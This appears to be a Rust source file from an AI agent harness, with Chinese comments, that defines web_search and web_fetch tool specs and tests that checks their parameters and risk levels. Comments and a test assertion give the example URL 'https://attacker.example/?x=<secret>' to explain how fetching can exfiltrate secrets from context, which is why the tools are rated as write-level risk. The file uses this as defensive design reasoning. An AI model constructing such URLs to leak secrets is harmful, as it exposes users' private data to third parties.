use super::*;

/// 联网检索。
///
/// # 为什么它不是「读网页」
///
/// 只回搜索结果的摘要与 URL，不抓正文。抓正文要处理反爬、编码、
/// 超时、以及「一页 300KB 的 HTML 塞进上下文」—— 而模型要的通常
/// 就是那几句摘要。真要读某一页时，那是另一个工具（还没有）。
#[must_use]
pub fn web_search_spec() -> ToolSpec {
    ToolSpec {
        name: "web_search".into(),
        description: concat!(
            "上网搜一下。回的是搜索结果的标题、链接与摘要 —— ",
            "不是网页正文。用它来查你不知道或可能已经过时的事实",
            "（新版本号、今天的新闻、某个 API 的现状）",
        )
        .into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "query": { "type": "string", "description": "搜索词" },
                "limit": { "type": "integer", "description": "最多回几条，默认 5，上限 5" },
                // ⚠️ **这两位的描述要说清「什么时候用」，不只是「有什么值」。**
                // 只列枚举的话模型永远走默认档，于是它拿到一串没有日期的
                // 结果，然后把一条 2019 年的当成现状讲给用户。
                "topic": {
                    "type": "string",
                    "enum": ["general", "news"],
                    "description": concat!(
                        "默认 general。问的是新闻、时事、或者「最近发生了什么」时用 news —— ",
                        "只有 news 档的结果会带发布日期，而没有日期你分不出一条结果是昨天的还是几年前的",
                    )
                },
                "time_range": {
                    "type": "string",
                    "enum": ["day", "week", "month", "year"],
                    "description": "只要这段时间内发布的。不确定就别传 —— 传窄了会把本来搜得到的结果滤掉"
                }
            },
            "required": ["query"]
        }),
        // ⚠️ **不是 Safe。** 别的只读工具读的是用户自己的东西；
        // 这一个**把用户的话发到第三方服务上**。搜索词里完全可能带着
        // 上下文里的私密信息（「张三的合同里那个违约金条款」），
        // 而那句话一旦发出去就收不回来了 —— 与截屏同一类风险：
        // 不是「改了什么」，是「泄露了什么」。
        //
        // Write 档而不是 Execute：它花钱、有外发，但不碰这台机器上的
        // 任何东西，与「写一个文件」同一级
        risk: Risk::Write,
        path_arg: None,
        source: ToolSource::Builtin,
    }
}

pub fn web_fetch_spec() -> ToolSpec {
    ToolSpec {
        name: "web_fetch".into(),
        description: concat!(
            "把一个网页读回来（正文，markdown）。搜索只给标题和摘要 —— ",
            "要看细节（API 参数、完整步骤、代码示例）就用这个。",
            "长页面会分段：结果里带着整页多长、下一段从哪开始",
        )
        .into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "url": { "type": "string", "description": "要读的网页地址（http/https）" },
                // ⚠️ 这一位的说明要讲清「什么时候用」。只说「起始位置」的话，
                // 模型看到 `next_offset` 也不知道该拿它干什么，于是永远只读
                // 第一段，然后拿着半篇文档回答
                "offset": {
                    "type": "integer",
                    "description": concat!(
                        "从整页的第几个字符接着读。上一次结果里的 next_offset 原样填进来，",
                        "就能读下一段；第一次不用传",
                    )
                }
            },
            "required": ["url"]
        }),
        // 与 `web_search` 同级，理由也同一条：它**把 URL 发到第三方服务上**。
        //
        // ⚠️ 而且它比搜索更宽 —— 搜索发的是一句搜索词，抓取发的是一个
        // 完整 URL，而 `https://attacker.example/?x=<上下文里的密钥>` 就是
        // 一次外泄，长得却和一次正常抓取一模一样。确认面板上要摆完整 URL，
        // 不能只显示域名
        risk: Risk::Write,
        path_arg: None,
        source: ToolSource::Builtin,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// ⚠️ **服务端支持一个参数，而工具目录里没有它 = 那个参数不存在。**
    ///
    /// 模型只能看见 `parameters` 里写着的东西。服务端把 `topic` /
    /// `time_range` 认得再好，只要这里没声明，模型永远不会填 —— 于是
    /// 那一整条链路是死的，而**没有任何一处会报错**：搜索照样返回结果，
    /// 只是永远没有日期，而模型会把一条 2019 年的结果当成现状讲出来。
    ///
    /// 这个仓库反复吃的「造好了没人调用」，在工具目录这一侧就长这样。
    #[test]
    fn 联网检索把决定日期的那两位摆进了工具目录() {
        let spec = web_search_spec();
        let props = spec.parameters["properties"]
            .as_object()
            .expect("参数表该是个对象");

        assert!(props.contains_key("query"), "搜索词");
        for key in ["topic", "time_range"] {
            assert!(
                props.contains_key(key),
                "`{key}` 在服务端认得，但工具目录里没有 —— 模型永远不会填它"
            );
        }

        let topic = &props["topic"];
        let values: Vec<&str> = topic["enum"]
            .as_array()
            .expect("topic 该给枚举")
            .iter()
            .filter_map(|v| v.as_str())
            .collect();
        assert!(
            values.contains(&"news"),
            "`news` 是唯一能带出发布日期的那一档，枚举里没有它等于这个能力不存在"
        );

        // 光有枚举不够：只列值不说「什么时候用」的话，模型永远走默认档。
        // 这条断言盯的是那句话还在
        let desc = topic["description"].as_str().unwrap_or_default();
        assert!(
            desc.contains("日期"),
            "topic 的说明要讲清「只有这一档带日期」，否则模型没有理由选它。实际：{desc}"
        );
    }

    /// ⚠️ **`offset` 必须摆进工具目录，而且说明要讲清怎么用。**
    ///
    /// 长页面分段读全靠它。目录里没有的话模型永远只读第一段，然后拿着
    /// 半篇文档回答 —— 而没有任何一处会报错。就算摆了，说明里只写
    /// 「起始位置」也不够：模型看到结果里的 `next_offset` 未必知道
    /// 该拿它干什么。
    #[test]
    fn 抓网页那个工具把分段读的钩子摆了出来() {
        let spec = web_fetch_spec();
        let props = spec.parameters["properties"]
            .as_object()
            .expect("参数表该是个对象");

        assert!(props.contains_key("url"));
        assert!(
            props.contains_key("offset"),
            "没有 offset，长页面就只能读第一段 —— 而实测七个页面里三个超一次的预算"
        );
        let desc = props["offset"]["description"].as_str().unwrap_or_default();
        assert!(
            desc.contains("next_offset"),
            "说明里要点名 next_offset，模型才知道这两者是一对。实际：{desc}"
        );

        assert_eq!(
            spec.risk,
            Risk::Write,
            concat!(
                "它把完整 URL 发到第三方 —— `?x=<上下文里的密钥>` 就是一次外泄，",
                "而它长得和一次正常抓取一模一样",
            )
        );
    }
}
